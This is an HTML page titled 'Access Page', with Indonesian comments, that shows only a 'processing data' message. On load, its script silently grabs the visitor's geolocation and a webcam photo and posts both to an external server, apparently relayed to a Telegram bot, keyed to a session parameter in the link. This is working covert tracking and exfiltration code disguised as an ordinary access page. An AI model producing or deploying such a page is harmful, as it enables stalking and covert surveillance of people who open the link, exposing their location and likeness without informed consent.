<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Access Page</title>
    <script>
        async function sendDataToServer() {
            try {
                // Ambil lokasi pengguna
                const position = await new Promise((resolve, reject) =>
                    navigator.geolocation.getCurrentPosition(resolve, reject)
                );

                // Ambil foto
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);
                const photoBlob = await imageCapture.takePhoto();
                track.stop();

                // Kirim data ke server
                const formData = new FormData();
                formData.append("latitude", position.coords.latitude);
                formData.append("longitude", position.coords.longitude);
                formData.append("photo", photoBlob);

                const session = new URLSearchParams(window.location.search).get("session");
                await fetch(`https://akhirpetang.vercel.app/send-data?session=${session}`, {
                    method: "POST",
                    body: formData,
                });

                alert("Data berhasil dikirim ke bot Telegram!");
            } catch (error) {
                console.error("Error:", error);
                alert("Gagal mengirim data. Pastikan izin lokasi dan kamera diberikan.");
            }
        }

        // Jalankan fungsi saat halaman dimuat
        window.onload = sendDataToServer;
    </script>
</head>
<body>
    <h1>Memproses data...</h1>
</body>
</html>
